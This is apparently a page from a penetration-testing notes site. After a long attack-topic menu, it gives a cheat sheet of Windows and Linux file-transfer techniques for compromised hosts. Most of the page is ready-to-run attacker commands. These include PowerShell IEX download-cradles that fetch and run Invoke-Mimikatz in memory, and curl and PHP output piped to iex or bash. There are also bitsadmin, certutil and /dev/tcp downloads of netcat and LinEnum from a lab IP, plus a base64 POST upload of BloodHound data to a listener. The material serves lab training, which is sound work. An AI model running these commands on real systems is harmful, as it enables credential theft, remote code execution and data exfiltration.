class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_7 type=checkbox id=__nav_2_4_7> <label class=md-nav__link for=__nav_2_4_7> Login Brute Forcing <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Login Brute Forcing" data-md-level=3> <label class=md-nav__title for=__nav_2_4_7> <span class="md-nav__icon md-icon"></span> Login Brute Forcing </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../login_brute_forcing/basic_http_auth_brute_forcing/ class=md-nav__link> Basic HTTP Auth Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/web_forms_brute_forcing/ class=md-nav__link> Web Forms Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/service_authentication/ class=md-nav__link> Service Authentication Attacks </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_8 type=checkbox id=__nav_2_4_8> <label class=md-nav__link for=__nav_2_4_8> Atk Common Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Common Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_4_8> <span class="md-nav__icon md-icon"></span> Atk Common Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_common_apps/setting_the_stage/ class=md-nav__link> Setting the Stage </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/content_management_systems/ class=md-nav__link> Content Management Systems </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/containers_software_dev/ class=md-nav__link> Servlet Containers/Software Development </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/infra_network_monitoring_tools/ class=md-nav__link> Infrastructure/Network Monitoring Tools </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/cs_config_mgmt/ class=md-nav__link> Customer Service Mgmt & Configuration Mgmt </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/closing_out/ class=md-nav__link> Closing Out </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_9 type=checkbox id=__nav_2_4_9> <label class=md-nav__link for=__nav_2_4_9> Atk Web Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Web Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_4_9> <span class="md-nav__icon md-icon"></span> Atk Web Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_web_applications/http_verb_tampering/ class=md-nav__link> HTTP Verb Tampering </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/idor/ class=md-nav__link> Insecure Direct Object References </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/xxe/ class=md-nav__link> XML External Entity (XXE) Injection </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/sql_injection/ class=md-nav__link> SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_10 type=checkbox id=__nav_2_4_10> <label class=md-nav__link for=__nav_2_4_10> Server Side Atks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Server Side Atks" data-md-level=3> <label class=md-nav__title for=__nav_2_4_10> <span class="md-nav__icon md-icon"></span> Server Side Atks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_10_1 type=checkbox id=__nav_2_4_10_1> <label class=md-nav__link for=__nav_2_4_10_1> SSRF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSRF data-md-level=4> <label class=md-nav__title for=__nav_2_4_10_1> <span class="md-nav__icon md-icon"></span> SSRF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssrf/ class=md-nav__link> SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/blind_ssrf/ class=md-nav__link> Blind SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/time_based_ssrf/ class=md-nav__link> Time-Based SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_10_2 type=checkbox id=__nav_2_4_10_2> <label class=md-nav__link for=__nav_2_4_10_2> SSI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSI data-md-level=4> <label class=md-nav__title for=__nav_2_4_10_2> <span class="md-nav__icon md-icon"></span> SSI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_overview/ class=md-nav__link> Overview </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_example/ class=md-nav__link> Example </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_10_3 type=checkbox id=__nav_2_4_10_3> <label class=md-nav__link for=__nav_2_4_10_3> ESI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ESI data-md-level=4> <label class=md-nav__title for=__nav_2_4_10_3> <span class="md-nav__icon md-icon"></span> ESI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/esi_overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_10_4 type=checkbox id=__nav_2_4_10_4> <label class=md-nav__link for=__nav_2_4_10_4> SSTI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSTI data-md-level=4> <label class=md-nav__title for=__nav_2_4_10_4> <span class="md-nav__icon md-icon"></span> SSTI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_intro/ class=md-nav__link> Intro </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example1/ class=md-nav__link> SSTI Example1 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example2/ class=md-nav__link> SSTI Example2 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example3/ class=md-nav__link> SSTI Example3 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_11 type=checkbox id=__nav_2_4_11> <label class=md-nav__link for=__nav_2_4_11> File Inclusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Inclusion" data-md-level=3> <label class=md-nav__title for=__nav_2_4_11> <span class="md-nav__icon md-icon"></span> File Inclusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/intro/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_11_2 type=checkbox id=__nav_2_4_11_2> <label class=md-nav__link for=__nav_2_4_11_2> LFI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=LFI data-md-level=4> <label class=md-nav__title for=__nav_2_4_11_2> <span class="md-nav__icon md-icon"></span> LFI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/lfi/ class=md-nav__link> LFI </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/lfi_to_rce/ class=md-nav__link> LFI to RCE </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_11_3 type=checkbox id=__nav_2_4_11_3> <label class=md-nav__link for=__nav_2_4_11_3> Other Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Other Techniques" data-md-level=4> <label class=md-nav__title for=__nav_2_4_11_3> <span class="md-nav__icon md-icon"></span> Other Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/other_php_wrappers/ class=md-nav__link> PHP Wrappers </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/remote_file_inclusion/ class=md-nav__link> RFI </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../file_inclusion/hardening_tips/ class=md-nav__link> Hardening Tips </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_12 type=checkbox id=__nav_2_4_12> <label class=md-nav__link for=__nav_2_4_12> Shells&Payloads <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Shells&amp;Payloads data-md-level=3> <label class=md-nav__title for=__nav_2_4_12> <span class="md-nav__icon md-icon"></span> Shells&Payloads </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../shells_payloads/msfvenom/ class=md-nav__link> MSFvenom </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/windows_shells/ class=md-nav__link> Windows Shells </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/unix_linux/ class=md-nav__link> NIX Shells </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_13 type=checkbox id=__nav_2_4_13> <label class=md-nav__link for=__nav_2_4_13> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_2_4_13> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/nmap/ class=md-nav__link> Nmap </a> </li> <li class=md-nav__item> <a href=../../tools/ffuf/ class=md-nav__link> Ffuf </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5> Blue Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_analysis/useful_links/ class=md-nav__link> File Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5_2 type=checkbox id=__nav_2_5_2> <label class=md-nav__link for=__nav_2_5_2> Network Traffic Analysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_2_5_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/layers/ class=md-nav__link> Layers </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/analysis/ class=md-nav__link> Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5_2_3 type=checkbox id=__nav_2_5_2_3> <label class=md-nav__link for=__nav_2_5_2_3> Tcpdump <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_2_5_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> Fundamentals </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> Packet Filtering </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5_2_4 type=checkbox id=__nav_2_5_2_4> <label class=md-nav__link for=__nav_2_5_2_4> Wireshark <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_2_5_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> Advanced Usage </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_6 type=checkbox id=__nav_2_6> <label class=md-nav__link for=__nav_2_6> Resources <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Resources data-md-level=2> <label class=md-nav__title for=__nav_2_6> <span class="md-nav__icon md-icon"></span> Resources </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../useful_resources/links/ class=md-nav__link> Useful Links </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__link--index "> <a href=../../blog/ >Blog</a> <label for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 2022 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2022 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2022 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blog/2022/lets_connect/ class=md-nav__link> Lets Connect </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#powershell-downloads class=md-nav__link> Powershell Downloads </a> </li> <li class=md-nav__item> <a href=#powershell-file-uploads class=md-nav__link> Powershell File Uploads </a> </li> <li class=md-nav__item> <a href=#bitsadmin class=md-nav__link> Bitsadmin </a> </li> <li class=md-nav__item> <a href=#certutil class=md-nav__link> Certutil </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1 id=windows-file-transfer-methods>Windows File Transfer Methods<a class=headerlink href=#windows-file-transfer-methods title="Permanent link">&para;</a></h1> <h2 id=powershell-downloads>Powershell Downloads<a class=headerlink href=#powershell-downloads title="Permanent link">&para;</a></h2> <p>In any version of <strong>PowerShell</strong>, the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a> class can be used to download a file over <strong>HTTP</strong>.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>PS C:\htb&gt; (New-Object System.Net.WebClient).DownloadFile(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;,&quot;C:\Users\Public\Downloads\PowerView.ps1&quot;)
</code></pre></div> <p>From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases <strong>iwr</strong>, <strong>curl</strong>, and <strong>wget</strong> can be used instead of Invoke-WebRequest.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a>PS C:\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
</code></pre></div> <p>Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias <strong>iex</strong>.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>PS C:\htb&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;)
</code></pre></div> <p>IEX also accepts pipeline input.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>PS C:\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
</code></pre></div> <p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/24/IEerror.png></p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/24/IE_settings.png></p> <p>This can be bypassed using the parameter -<strong>UseBasicParsing</strong>.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>PS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | iex
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer&#39;s first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>At line:1 char:1
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>PS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | iex
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>PS C:\htb&gt; Invoke-CheckLocalAdminAccess
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>ComputerName IsAdmin
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a>------------ -------
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a>localhost      False
</code></pre></div> <p>With administrative access to the machine, we can disable Internet Explorers First Run customization.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a>C:\htb&gt; reg add &quot;HKLM\SOFTWARE\Microsoft\Internet Explorer\Main&quot; /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
</code></pre></div> <hr> <h2 id=powershell-file-uploads>Powershell File Uploads<a class=headerlink href=#powershell-file-uploads title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a>PS C:\htb&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path &#39;c:/users/public/downloads/BloodHound.zip&#39; -Encoding Byte))
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>PS C:\htb&gt; Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
</code></pre></div> <p>After catching the base64 data with Netcat, the payload can be decoded.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=nb>echo</span> &lt;base64&gt; <span class=p>|</span> base64 -d -w <span class=m>0</span> &gt; bloodhound.zip
</code></pre></div> <h2 id=bitsadmin>Bitsadmin<a class=headerlink href=#bitsadmin title="Permanent link">&para;</a></h2> <p>The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a>PS C:\htb&gt; bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
</code></pre></div> <p>Download</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a>PS C:\htb&gt; Import-Module bitstransfer;Start-BitsTransfer -Source &quot;http://10.10.10.32/nc.exe&quot; -Destination &quot;C:\Temp\nc.exe&quot;
</code></pre></div> <p>Upload</p> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a>PS C:\htb&gt; Start-BitsTransfer &quot;C:\Temp\bloodhound.zip&quot; -Destination &quot;http://10.10.10.132/uploads/bloodhound.zip&quot; -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
</code></pre></div> <h2 id=certutil>Certutil<a class=headerlink href=#certutil title="Permanent link">&para;</a></h2> <p>Essentially serving as Wget for Windows. Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a>C:\htb&gt; certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
</code></pre></div> <hr> <h1 id=linux-file-transfer-methods>Linux File Transfer Methods<a class=headerlink href=#linux-file-transfer-methods title="Permanent link">&para;</a></h1> <h2 id=wget-curl>Wget / cURL<a class=headerlink href=#wget-curl title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=gp>hrmns@htb[/htb]$ </span>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
</code></pre></div> <hr> <h2 id=openssl>OpenSSL<a class=headerlink href=#openssl title="Permanent link">&para;</a></h2> <p>OpenSSL can be used to send files "nc style."</p> <p>Create certificate</p> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a><span class=gp>hrmns@htb[/htb]$ </span>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days <span class=m>365</span> -out certificate.pem
</code></pre></div> <p>Stand up server</p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=gp>hrmns@htb[/htb]$ </span>openssl s_server -quiet -accept <span class=m>80</span> -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh
</code></pre></div> <p>Download file</p> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=gp>hrmns@htb[/htb]$ </span>openssl s_client -connect <span class=m>10</span>.10.10.32:80 -quiet &gt; LinEnum.sh
</code></pre></div> <hr> <h2 id=bash-devtcp>Bash (/dev/tcp)<a class=headerlink href=#bash-devtcp title="Permanent link">&para;</a></h2> <p>There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads.</p> <p>Connect to Target's Webserver</p> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=nb>exec</span> <span class=m>3</span>&lt;&gt;/dev/tcp/10.10.10.32/80
</code></pre></div> <p>HTTP GET Request</p> <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=nb>echo</span> -e <span class=s2>&quot;GET /LinEnum.sh HTTP/1.1\n\n&quot;</span>&gt;<span class=p>&amp;</span><span class=m>3</span>
</code></pre></div> <p>Print Response</p> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a><span class=gp>hrmns@htb[/htb]$ </span>cat &lt;<span class=p>&amp;</span><span class=m>3</span>
</code></pre></div> <hr> <h2 id=php>PHP<a class=headerlink href=#php title="Permanent link">&para;</a></h2> <p>PHP is also very prevalent and provides multiple file tranfer methods</p> <p>File_get_contents()</p> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a><span class=x>hrmns@htb[/htb]$ php -r &#39;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</span>
</code></pre></div> <p>Fopen()</p> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a><span class=x>hrmns@htb[/htb]$ php -r &#39;const BUFFER = 1024; $fremote = </span>
<a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a><span class=x>fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);&#39;</span>
</code></pre></div> <p>If the <strong>php-curl</strong> module has been installed, this can alternatively be used.</p> <p>Php-curl</p> <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=x>hrmns@htb[/htb]$ php -r &#39;$rfile = &quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;; $lfile = &quot;LinEnum.sh&quot;; $fp = fopen($lfile, &quot;w+&quot;); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);&#39;</span>
</code></pre></div> <p>It is also possible to retrieve each line as an array and pipe the output to bash.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a><span class=x>hrmns@htb[/htb]$ php -r &#39;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) { echo $line; }&#39; | bash</span>
</code></pre></div> <hr> <h2 id=python>Python<a class=headerlink href=#python title="Permanent link">&para;</a></h2> <p>Python is often present on Linux and can be used to download files when Wget and cURL are not available. Although Python isnt currently installed by default in Windows, typing <strong>Python</strong> in a command prompt opens the Windows Store's official distribution with a single-click install. Python is frequently installed on developer and IT computers and is bundled by default with major business financial applications such as Bloomberg (Bloomberg Professional Services).</p> <p>Python2</p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=gp>hrmns@htb[/htb]$ </span>python2
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a><span class=kn>import</span> <span class=nn>urllib</span>
<a id=__codelineno-26-2 name=__codelineno-26-2 href=#__codelineno-26-2></a><span class=n>urllib</span><span class=o>.</span><span class=n>urlretrieve</span> <span class=p>(</span><span class=s2>&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;</span><span class=p>,</span> <span class=s2>&quot;LinEnum.sh&quot;</span><span class=p>)</span>
</code></pre></div> <p>Python 3</p> <div class=highlight><pre><span></span><code><a id=__codelineno-27-1 name=__codelineno-27-1 href=#__codelineno-27-1></a><span class=gp>hrmns@htb[/htb]$ </span>python3
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-28-1 name=__codelineno-28-1 href=#__codelineno-28-1></a><span class=kn>import</span> <span class=nn>urllib.request</span>
<a id=__codelineno-28-2 name=__codelineno-28-2 href=#__codelineno-28-2></a><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlretrieve</span><span class=p>(</span><span class=s2>&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;</span><span class=p>,</span> <span class=s2>&quot;LinEnum.sh&quot;</span><span class=p>)</span>
